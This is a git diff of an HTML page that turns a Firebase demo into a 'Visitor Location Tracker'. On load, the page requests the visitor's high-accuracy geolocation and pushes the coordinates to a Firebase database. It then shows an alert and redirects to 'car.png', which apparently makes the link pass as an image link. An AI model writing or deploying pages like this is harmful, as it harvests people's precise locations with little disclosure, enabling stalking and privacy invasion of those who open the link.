@@ -3,16 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>Visitor Location Tracker</title>
 </head>
 <body>
-    <h1>Location Tracker</h1>
-
-    <!-- Firebase SDK Import -->
+    <h1>Welcome to Visitor Location Tracker</h1>
+    
+    <!-- Include the Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"></script>
 
-    <!-- Firebase Configuration and Initialization -->
     <script>
         // Your web app's Firebase configuration
         const firebaseConfig = {
@@ -27,25 +26,46 @@
         };
 
         // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        firebase.initializeApp(firebaseConfig);
 
-        // Function to push data to 'Users' node in Firebase Realtime Database
-        function pushUserData(name, age, address) {
-            firebase.database().ref('/Users/').push({ 
-                name: name,
-                age: age,
-                address : address
-            });
+        // Function to get the visitor's location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
         }
 
-        // Example usage
-        const name = "John Doe";
-        const age = 30;
-        const address = "123 Street, City";
+        // Function to handle errors in geolocation
+        function errorHandler(error) {
+            console.log("Error getting location:", error.message);
+        }
 
-        // Call the function to push data
-        pushUserData(name, age, address);
+        // Function to save the visitor's location in Firebase Realtime Database and show an alert
+        function savePosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            console.log("Latitude: " + latitude + " Longitude: " + longitude);
+
+            // Push the location data to Firebase Realtime Database
+            firebase.database().ref('/Users/').push({ Longitude: longitude, Latitude: latitude })
+                .then(() => {
+                    console.log('Location data saved successfully');
+                    // Show an alert
+                    alert("Location data saved successfully!");
+                    // Redirect to "car.png"
+                    window.location.replace("car.png");
+                })
+                .catch(error => {
+                    console.error('Error saving location data:', error);
+                });
+        }
+
+        // Call the getLocation function when the page loads
+        window.onload = function() {
+            getLocation();
+        };
     </script>
 </body>
 </html>
